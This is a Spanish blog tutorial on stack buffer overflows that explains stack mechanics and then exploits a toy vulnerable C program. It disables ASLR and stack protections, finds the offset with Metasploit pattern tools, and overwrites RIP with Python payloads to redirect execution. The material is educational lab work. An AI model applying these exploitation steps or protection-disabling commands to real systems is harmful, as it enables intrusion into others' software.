---
layout: post
title:  "Aprendiendo Buffer Overflow (Parte 1)"
date:   2021-01-17 12:44:24 +0100
categories: pentesting buffer-overflow
excerpt_separator: <!--more-->
---

Una introducción sobre buffer overflow, introduciendo algunos conceptos básicos y explicando un
ejemplo sencillo paso a paso.
<!--more-->

## Contenidos
<ul>
    <li><a style="font-size: 20px" href="#before-begin">Conceptos básicos antes de empezar</a></li> 
    <li><a style="font-size: 20px" href="#stack-behavior">¿Cómo se comporta la pila en un caso real?</a></li> 
    <li><a style="font-size: 20px" href="#how-buffer-overflow-is-produced">¿Cómo se produce el buffer overflow?</a></li>
    <li><a style="font-size: 20px" href="#buffer-overflow-practice">Práctica sencilla de Buffer Overflow (64 bits)</a></li>
    <ul>
        <li><a style="font-size: 18px" href="#environment-preparation">Preparando el entorno</a></li>
        <li><a style="font-size: 18px" href="#compiling-and-executing">Compilando el código y probando la ejecución</a></li>
        <li><a style="font-size: 18px" href="#detecting-buffer-overflow">Detectando el Buffer Overflow</a></li>
        <li><a style="font-size: 18px" href="#guessing-buffer-size">Averiguando el tamaño del buffer</a></li>
        <li><a style="font-size: 18px" href="#overriding-IP">Sobrescribiendo el registro IP</a></li>
        <li><a style="font-size: 18px" href="#taking-control">Tomando el control</a></li>
        <li><a style="font-size: 18px" href="#conclusions">Conclusiones</a></li>    
    </ul>
</ul>

## <a name="before-begin"></a> Conceptos básicos antes de empezar

Antes de entrar en materia conviene repasar algunos conceptos básicos sobre el funcionamiento de la 
**memoria para un proceso en ejecución**, así como una breve introducción del **lenguaje ensamblador**. 
De todas formas, y siendo consciente de que el tiempo es oro, si lo que quieres es entrar en materia
puedes saltarte este apartado introductorio.


En lo que respecta a la ejecución de un proceso, a modo de resumen, nos encontramos con:

* `Memoria principal`: La CPU la utilizará para leer las instrucciones a ejecutar y para leer y 
escribir datos.
* `ALU (Unidad Aritmético Lógica)`: Se encarga de las operaciones lógicas y matemáticas. 
Consta de una serie de registros donde se almacenan temporalmente los datos para agilizar las 
operaciones.
* `CPU`: Lee las instrucciones y las ejecuta, coordinando memoria y ALU. Además, posee un 
registro llamado puntero de instrucción que almacena la próxima instrucción a ejecutar.


Para comprender claramente **qué está ocurriendo cuando la CPU ejecuta una instrucción** también se debe
tener en mente las siguientes fases:

* `Búsqueda`: Primero se busca la instrucción a ejecutar, basándose en la dirección a la que 
apunta el puntero de instrucción (IP).
* `Decodificación`: Se decodifica la instrucción para determinar que acción ejecutar, se actualiza 
el IP a la siguiente instrucción y se leen los operandos necesarios.
* `Ejecución`: Se envían los operandos a la ALU y se crean las señales de control para realizar la
operación.
* `Escritura`: Se guardan los valores de los registros en memoria principal.

Una vez comprendido este proceso, veamos los **registros que componen la CPU**, o más bien, aquellos 
que resultan más relevantes.

* `AX`, `BX`, `CX` y `DX`: Registros usados para operaciones aritméticas.
* `SI`, `DI`, `BP` y `SP`: Registros de propósito general, aunque habitualmente tienen
una función concreta:
    * `SI`: Dirección origen.
    * `DI`: Dirección destino.
    * `BP`: Puntero a la base de la pila.
    * `SP`: Puntero a la cima de la pila.
* `IP`: Apunta a la siguiente instrucción y, por lo tanto, probablemente el registro más
relevante para un buffer overflow (quien controla el IP controla el flujo del programa).

Ahora, hagamos un breve repaso de las **instrucciones en ensamblador más relevantes**:

* `JMP dst`: Salta a la dirección `dst` (modifica el `IP`).
* `PUSH reg`: Guarda el contenido de `reg` en la pila (aumenta el valor del `SP`).
* `POP reg`: Extrae el primer elemento de la pila en `reg` (reduce el valor del `SP`).
* `CALL subrout`: Llama a la subrutina indicada por la etiqueta `subrout` (realiza un PUSH `IP`)
* `RET`: Retorna de la subrutina en el punto donde se había llamado (realiza un `POP IP`)
* `NOP`: No hace nada, simplemente se pierde un ciclo de reloj.
* `ADD dst, orig`: Suma `orig` y `dst` y guarda el resultado en `dst`.
* `MOV dst, orig`: Mueve `orig` a `dst`.

Finalmente, echemos un ojo a la estructura de la **memoria de un proceso**. Como podemos apreciar, un
proceso define varias zonas de memoria con sus correspondientes permisos.

{:refdef: style="text-align: center;"}
![Memoria de un proceso](/assets/buff_overflow_1.svg)
{: refdef}

* `Código`: Zona de solo lectura, se almacenan las instrucciones del proceso.
* `Datos`: Zona de solo lectura, se almacenan las variables globales inicializadas y no
inicializadas. Su tamaño no puede modificarse en tiempo de ejecución, se decide durante la
compilación.
* `Heap`: Zona de lectura y escritura, se almacenan los datos dinámicos del proceso por lo
tanto es una zona que puede crecer durante la ejecución del proceso.
* `Pila`: Zona de lectura y escritura, se almacenan las variables locales de los procesos y se
utiliza para saltar entre rutinas mediante el almacenamiento de los registros, los argumentos de
dichas rutinas y el valor de retorno para retomar el proceso en el punto anterior a la llamada a
la rutina.

## <a name="stack-behavior"></a> ¿Cómo se comporta la pila en un caso real?

Analicemos en primer lugar el **comportamiento de la pila para un código sencillo en C**.

{% highlight c %}
int suma(int a, int b)
{
  int d;
  d = a + b;
  return d;
}
int main(void)
{
  int x;
  x = suma(1,2);
  return x;
}
{% endhighlight %}

Este pequeño programa puede traducirse en las siguientes operaciones con respecto a la pila:

1. La pila empieza vacía. Los registros `SP y BP apuntan a la misma dirección` (inicio de la pila).
2. Se hace un push del primer argumento de la función suma `PUSH #1`.
3. Se hace un push del segundo argumento de la función suma `PUSH #2`.
4. Se llama a la función suma `CALL suma`. Como ya sabemos va implícito un `PUSH IP` 
(necesitamos saber cual era la siguiente instrucción antes de llamar a la función).
5. Se hace un push del puntero base de la pila `PUSH BP` (necesitamos mantener en todo momento el inicio de
la pila).
6. Se desplaza el puntero base de la pila a la cima `MOV BP, SP`. Como vemos volvemos a estar en
la misma situación que la inicial y estaríamos en disposición de llamar a otra función diferente.
7. Se realizaría la suma, en este caso no habría necesidad de almacenar nada en la pila.
8. Se volvería hacia atrás para salir de la función. Primero restaurando el registro BP al inicio
"real" de la pila `POP BP`.
9. Por último, se realizaría la operación `RET`, que implícitamente realiza un `POP IP` para
almacenar en el IP instrucción siguiente que corresponde.
10. La dos operaciones restantes serían un `POP` sobre los argumentos restantes.

Puede parecer realmente complicado pero te recomiendo centrarte en la siguiente imagen que describe de 
una forma más visual y clara qué está sucediendo:

{:refdef: style="text-align: center;"}
![Ejemplo de instrucciones](/assets/buff_overflow_2.svg)
{: refdef}

## <a name="how-buffer-overflow-is-produced"></a> ¿Cómo se produce el buffer overflow?

Llega el momento de comprender **que está sucediendo cuando hablamos de Buffer Overflow**. Para ello, se propone
otro caso práctico sencillo. Se considera el siguiente programa:

{% highlight c %}
void anotherMethod()
{
  printf("This method is never called!");
}

void saySomething()
{
  char buffer[500];
  scanf("%s", buffer);
  printf("%s\n", buffer);
}
int main(void)
{
  saySomething();
  return 0;
}
{% endhighlight %}

Se desengrana el comportamiento de la pila para este caso:

{:refdef: style="text-align: center;"}
![Instrucciones pila para caso práctico](/assets/buff_overflow_3.svg)
{: refdef}

Este código reserva un buffer de **500 bytes en la pila**, al ser esta una variable local del método `saySomething`.
¿Qué pasaría si la entrada del usuario superase los 500 bytes reservados?. Tal y como se ilustra en la siguiente
imagen, llegaríamos a un estado incorrecto del proceso. Teniendo en cuenta que los siguientes bytes corresponden
a los valores del **registro BP e IP** (que contiene la siguiente instrucción a ejecutar).

{:refdef: style="text-align: center;"}
![Instrucciones pila con buffer overflow](/assets/buff_overflow_4.svg)
{: refdef}

Este estado es lo que se conoce como Buffer Overflow y es posible, generalmente debido a un error de programación.
En este caso, se está haciendo uso de un método inseguro como es `scanf`, que no comprueba el tamaño del buffer en
el que escribe. Por lo tanto, es posible exceder ese buffer reservado y sobrescribir otras direcciones de memoria.

## <a name="buffer-overflow-practice"></a> Práctica sencilla de Buffer Overflow (64 bits)

Es el momento de entrar en acción y no hay mejor manera de aprender que empezar a probar cosas. Para realizar este
ejemplo se ha utilizado:

* Un `Kali Linux de 64 bits` (aunque podría ser cualquier distribución de Linux de 64 bits).
* El `compilador gcc`, que debería venir por defecto en la mayoría de distribuciones Linux.
* El *debugger* `gdb` para observar los registros y poder realizar la explotación del buffer overflow.
* El *debugger* `edb-debugger` para ver de forma más gráfica los registros.
* `Python`, para automatizar la entrada de datos (aunque no es estrictamente necesario).

El código vulnerable a explotar será el descrito en la anterior sección:

{% highlight c %}
void anotherMethod()
{
  printf("This method is never called!");
}

void saySomething()
{
  char buffer[500];
  scanf("%s", buffer);
  printf("%s\n", buffer);
}
int main(void)
{
  saySomething();
  return 0;
}
{% endhighlight %}

### <a name="environment-preparation"></a> Preparando el entorno

Antes de nada, se debe **preparar el entorno** para explotar exitosamente el Buffer Overflow. Se necesita **desactivar
una serie de protecciones** presentes en el sistema operativo e introducidas por el propio compilador para evitar
este tipo de vulnerabilidades.

* Desactivar la `protección ASLR`. En pocas palabras, un mecanismo que hace aleatorio el espacio de direcciones de
un proceso, de forma que sea imposible predecir direcciones de salto.
  
{% highlight bash %}
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
{% endhighlight %}

* Desactivar `DEP (Data Execution Policy)`, que marca páginas de memoria como no ejecutables, para evitar por
ejemplo la ejecución de código en la pila. Para la práctica que se va a realizar no es necesario, pero si 
quisieramos ejecutar código en la pila (como un *shellcode*) necesitamos deshabilitar esta protección.
  
{% highlight bash %}
gcc codigo.c -z execstack -o ejecutable
{% endhighlight %}

* Desactivar `Stack Canaries/Cookies`, que son valores conocidos insertados entre un *buffer* y los datos de
control de la pila. Si se produce un desbordamiento estos valores cambiarán, permitiendo detectar estas situaciones
para luego manejarlas de forma apropiada.

{% highlight bash %}
$ gcc codigo.c -fno-stack-protector -o ejecutable
{% endhighlight %}

### <a name="compiling-and-executing"></a> Compilando el código y probando la ejecución

Como hemos visto anteriormente debemos realizar una compilación del código que contemple la deshabilitación de las
protecciones contra un buffer overflow. Para ello ejecutamos un:

{% highlight bash %}
gcc buffer.c -fno-stack-protector -z execstack -o buffer
{% endhighlight %}

Lanzamos el archivo ejecutable generado e introducimos como entrada cualquier valor:

{% highlight bash %}
./buffer
A
A
{% endhighlight %}

El programa se ejecuta y finaliza adecuadamente replicando el valor que hemos introducido como entrada.

### <a name="detecting-buffer-overflow"></a> Detectando el Buffer Overflow

Sabemos que el método `saySomething` reserva un buffer de 500 bytes y somos conscientes del comportamiento
de la pila porque lo hemos analizado previamente. En realidad, se reservará un tamaño ligeramente superior
al esperado, por lo tanto podemos utilizar una entrada ligeramente mayor que 500, además de esta forma
nos garantizaremos de que estamos sobrescribiendo el registro BP e IP.

{% highlight bash %}
python -c 'print("A"*540)' | ./buffer
{% endhighlight %}

Nos servimos de python en este caso para generar 540 bytes sin necesidad de escribir a mano 540 caracteres 'A'.
Este tamaño debería producir un *segmentation fault* durante la ejecución. Hemos encontrado la vulnerabilidad.

### <a name="guessing-buffer-size"></a> Averiguando el tamaño del buffer

El siguiente paso es **determinar el tamaño exacto del buffer** con la finalidad de saber en que punto exacto
comenzamos a sobrescribir el registro BP y finalmente el IP que nos permitirá controlar el flujo del programa.

Para ello nos servimos de la herramienta de metasploit `pattern_create`, (si estás utilizando otra
distro Linux tendrás que instalar metasploit o hacer los cálculos a mano). Esta herramienta generará una
cadena de la longitud indicada con un patrón que nunca se repite para averiguar posteriormete el tamaño del
buffer.

{% highlight bash %}
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 540
{% endhighlight %}

Una vez se obtiene la cadena ejecutaremos la aplicación con el gdb e introduciremos el patrón anterior como
entrada:

{% highlight bash %}
gdb -q buffer
r <<< $(python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9")') 
{% endhighlight %}

Volvemos a producir un desbordamiento, la peculariedad de utilizar el patrón es que si nos fijamos ahora 
en el registro BP, que sabemos que será aquel que se almacena en el stack inmediatamente después del buffer,
veremos como ha sido sobrescrito por parte de nuestro patrón.

{% highlight bash %}
x $rbp
0x4132724131724130
{% endhighlight %}

Ahora podemos utilizar la herramienta complementaria de *pattern_create* para obtener la tamaño exacto del
buffer indicando el valor del registro BP. Esta herramienta es `pattern_offset`:

{% highlight bash %}
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x4132724131724130
[*] Exact match at offset 512
{% endhighlight %}

Y podemos observar como el tamaño exacto reservado para el buffer es de **512 bytes**.

### <a name="overriding-IP"></a> Sobrescribiendo el registro IP

El objetivo final era sobrescribir el IP, basicamente porque es la demostración de que se puede controlar
el flujo del proceso. Esta parte requiere de un simple razonamiento lógico y es realmente sencilla si se
tiene de apoyo el diagrama de la pila que hemos realizado previamente.

Se sabe que la pila tiene un buffer para el que se han reservado 512 bytes. También se sabe que el siguiente 
elemento en la pila es el registro BP y detrás de este estará el IP. Teniendo en cuenta que esta máquina
es de 64 bits, obviamente los registros ocuparán 8 bytes. Por lo tanto, si se pretende escribir en el registro
IP necesitamos `512 bytes (buffer) + 8 bytes (BP) de relleno`.

Podemos realizar desde gdb la siguiente prueba:

{% highlight bash %}
r <<< $(python -c 'print("A"*520)+"\x42\x42\x42\x42\xff\xff\xff\xff"')
Program received signal SIGSEGV, Segmentation fault.
0xffffffff42424242 in ?? ()
{% endhighlight %}

Se envía un relleno de 520 bytes y luego una dirección en formato **Little Endian**, es importante tener en cuenta
el formato en el que se almacenan los datos en la máquina que se pretenda explotar porque, como vemos, en este
caso los bytes menos significativos se almacenan primero. Además, es necesario utilizar un formato canónico
para que el registro IP tome nuestro valor. Finalmente, tal y como se puede apreciar en el propio error, el
registro `IP toma el valor 0xffffffff42424242` que es el que nosotros hemos proporcionado.

### <a name="taking-control"></a> Tomando el control

Vamos ha realizar una acción más interesante que refleje la capacidad que supone tomar el control del registro IP.
Volviendo al código fuente, vemos como existe un método `anotherMethod` que nunca es invocado. Se pretende por lo
tanto demostrar que podemos controlar el flujo del programa mediante la invocación de dicho método.

Para invocar dicho método solo necesitamos sobrescribir el registro IP con la dirección donde se almacena dicho
método. Por lo tanto podemos obtener dicha dirección de la siguiente forma:

{% highlight bash %}
disassemble anotherMethod 
Dump of assembler code for function anotherMethod:
   0x0000555555555155 <+0>:     push   %rbp
   0x0000555555555156 <+1>:     mov    %rsp,%rbp
   0x0000555555555159 <+4>:     lea    0xea4(%rip),%rdi        # 0x555555556004
   0x0000555555555160 <+11>:    mov    $0x0,%eax
   0x0000555555555165 <+16>:    call   0x555555555040 <printf@plt>
   0x000055555555516a <+21>:    nop
   0x000055555555516b <+22>:    pop    %rbp
   0x000055555555516c <+23>:    ret    
End of assembler dump.
r <<< $(python -c 'print("A"*520)+"\x56\x51\x55\x55\x55\x55\x00\x00"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAVQUUUU
This method is never called![Inferior 1 (process 1479) exited with code 034]
{% endhighlight %}

Realizamos un `disassemble del método anotherMethod` para ver las instrucciones en ensamblador
y la posición de memoria que ocupan. Como la primera instrucción del método es un PUSH del registro
BP, y se ha sobrescrito con 8 caracteres 'A', se utiliza la dirección de la siguiente instrucción 
para evitar problemas. Como se puede apreciar ahora el método `anotherMethod` es llamado antes del
error de ejecución.

## <a name="conclusions"></a> Conclusiones

En esta entrada se han plasmado los **conceptos básicos** para entender y realizar un Buffer Overflow.
Además, se ha mostrado mediante un ejemplo práctico la explotación de dicha vulnerabilidad. Bajo mi
punto de vista, esta es una de las vulnerabilidades más complejas de comprender en profundidad dada
la dificultad que supone entender, entre otras cosas, el lenguaje ensamblador y la gestión de memoria
de un proceso. Sin embargo, a la hora de realizar la explotación de la vulnerabilidad no es necesario
tener un conocimiento tan extenso a bajo nivel, sino que es más que suficiente con tener una
comprensión clara de los conceptos que he intentado exponer en este artículo. Al final, casi siempre
se sigue un procedimiento mecánico, al menos a la hora de determinar tamaños de buffer y sobrescribir
el registro IP. Quizás la parte más compleja es la propia explotación del Buffer Overflow para insertar
algún tipo de código malicioso, como un shellcode, para obtener acceso al equipo como atacantes.
He realizado algunas prácticas de explotación simulando algunos entornos más reales.
En definitiva, la mejor manera de aprender es practicar y enfrentarse a diferentes casos. En un futuro
intentaré resumir en otro artículo la **explotación de la aplicación SLMail** en un sistema operativo Windows
de 32 bits. 

Hasta la siguiente entrada.
